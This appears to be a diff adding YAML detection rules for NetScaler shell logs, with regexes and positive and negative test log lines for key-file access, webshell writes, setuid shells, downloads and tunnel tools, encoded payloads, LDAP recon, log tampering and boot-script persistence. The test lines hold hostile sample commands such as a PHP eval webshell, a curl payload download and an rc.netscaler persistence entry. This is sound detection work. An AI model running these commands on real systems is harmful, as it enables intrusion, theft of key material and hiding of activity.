@@ -1,0 +1,123 @@
+# On-box shell activity (bash.log / sh.log). Patterns follow Mandiant's CVE-2023-3519 IOC
+# scanner and the later CitrixBleed/88771 reporting. netrescale's own sweep commands are
+# suppressed by tool_runs matching, never by account name.
+
+- id: shell-key-material
+  title: Shell access to NetScaler key material
+  severity: critical
+  sources: [bashlog, shlog]
+  match:
+    message_regex: '/(flash/)?nsconfig/(keys|ssl)\b|\bns\.key\b'
+  mitre: [T1552.004]
+  tests:
+    positive:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[4242]: nsroot on /dev/pts/0 shell_command="cat /flash/nsconfig/keys/updated/k1"'}
+    negative:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[4242]: nsroot on /dev/pts/0 shell_command="ls /var/log"'}
+
+- id: shell-webshell-write
+  title: PHP or webshell content written from a shell
+  severity: critical
+  sources: [bashlog, shlog]
+  match:
+    message_regex: '<\?php|eval\(\$_(POST|GET|REQUEST)|base64_decode\(\$_'
+  cve: [CVE-2023-3519]
+  mitre: [T1505.003]
+  tests:
+    positive:
+      - {source: shlog, line: "Oct  5 10:00:01 <local7.notice> ns-gw-01 sh[99]: nobody on ? shell_command=\"echo '<?php eval($_POST[x]);' > /var/netscaler/logon/a.php\""}
+    negative:
+      - {source: shlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 sh[99]: nsroot on /dev/pts/0 shell_command="echo hello"'}
+
+- id: shell-setuid
+  title: Setuid shell or permission escalation from a shell
+  severity: critical
+  sources: [bashlog, shlog]
+  match:
+    message_regex: 'chmod\s+([ugoa]*\+s|[2467][0-7]{3})\b|cp\s+/bin/(ba)?sh\b|chmod\s+\+s\s+/var'
+  cve: [CVE-2023-3519, CVE-2026-88771]
+  mitre: [T1548.001]
+  tests:
+    positive:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nobody on ? shell_command="cp /bin/sh /var/tmp/sh"'}
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nobody on ? shell_command="chmod u+s /var/tmp/sh"'}
+    negative:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nsroot on /dev/pts/0 shell_command="chmod 644 /var/tmp/report.txt"'}
+
+- id: shell-download-or-tunnel
+  title: Download or network tool run from a shell
+  severity: high
+  sources: [bashlog, shlog]
+  match:
+    message_regex: '(^|[;&|\s(])(curl|wget|fetch|tftp|nc|ncat|socat|ligolo|frpc|chisel)(\s|$)'
+  mitre: [T1105, T1572]
+  tests:
+    positive:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nsroot on /dev/pts/0 shell_command="curl -o /var/tmp/x http://203.0.113.9/x"'}
+    negative:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nsroot on /dev/pts/0 shell_command="tail -n 50 /var/log/ns.log"'}
+
+- id: shell-tmp-exec
+  title: Executable staged in a temp directory
+  severity: high
+  sources: [bashlog, shlog]
+  match:
+    message_regex: 'chmod\s+([ugoa]*\+x|[0-7]?[157][0-7]{2})\s+/(var/)?(tmp|nstmp)/|(^|[;&|\s])/(var/)?tmp/[^\s/]+(\s|$)'
+  mitre: [T1059.004]
+  tests:
+    positive:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nobody on ? shell_command="chmod +x /tmp/npc"'}
+    negative:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nsroot on /dev/pts/0 shell_command="ls -la /var/tmp/"'}
+
+- id: shell-encoded-or-inline-code
+  title: Encoded payload or inline interpreter code
+  severity: medium
+  sources: [bashlog, shlog]
+  match:
+    message_regex: 'base64\s+(-d|--decode|-D)|openssl\s+(enc|des3|aes-\d+-cbc)|python[0-9.]*\s+-c|perl\s+-e|php\s+-r'
+  mitre: [T1027, T1059]
+  tests:
+    positive:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nobody on ? shell_command="echo aWQK | base64 -d | sh"'}
+    negative:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nsroot on /dev/pts/0 shell_command="python3 --version"'}
+
+- id: shell-ldap-recon
+  title: LDAP enumeration from the appliance
+  severity: high
+  sources: [bashlog, shlog]
+  match:
+    message_regex: '\bldapsearch\b'
+  mitre: [T1087.002]
+  tests:
+    positive:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nobody on ? shell_command="ldapsearch -x -H ldap://10.0.0.5 -b dc=corp"'}
+    negative:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nsroot on /dev/pts/0 shell_command="cat /etc/hosts"'}
+
+- id: shell-log-tampering
+  title: Shell history or log tampering
+  severity: high
+  sources: [bashlog, shlog]
+  match:
+    message_regex: 'history\s+-c|unset\s+HISTFILE|HISTFILE=/dev/null|(rm|truncate|shred)\s.*(/var/log|\.log\b)|>\s*/var/log/'
+  mitre: [T1070.002, T1070.003]
+  tests:
+    positive:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nobody on ? shell_command="rm -f /var/log/httperror.log.0.gz"'}
+    negative:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nsroot on /dev/pts/0 shell_command="ls /var/log"'}
+
+- id: shell-persistence-edit
+  title: Write to a NetScaler persistence location (boot scripts, httpd.conf, cron)
+  severity: critical
+  sources: [bashlog, shlog]
+  match:
+    message_regex: '(>>?|\btee\b|sed\s+-i|\bcp\b|\bmv\b|\bvi\b|\bee\b|crontab\s+(-e|-r|/))\s*.*(rc\.netscaler|nsbefore\.sh|nsafter\.sh|httpd\.conf|/var/cron/tabs|/etc/crontab|authorized_keys)|crontab\s+-e'
+  mitre: [T1037, T1053.003, T1098.004]
+  tests:
+    positive:
+      - {source: bashlog, line: "Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nsroot on /dev/pts/0 shell_command=\"echo 'python /var/python/x.py &' >> /flash/nsconfig/rc.netscaler\""}
+    negative:
+      - {source: bashlog, line: 'Oct  5 10:00:01 <local7.notice> ns-gw-01 bash[1]: nsroot on /dev/pts/0 shell_command="cat /flash/nsconfig/rc.netscaler"'}
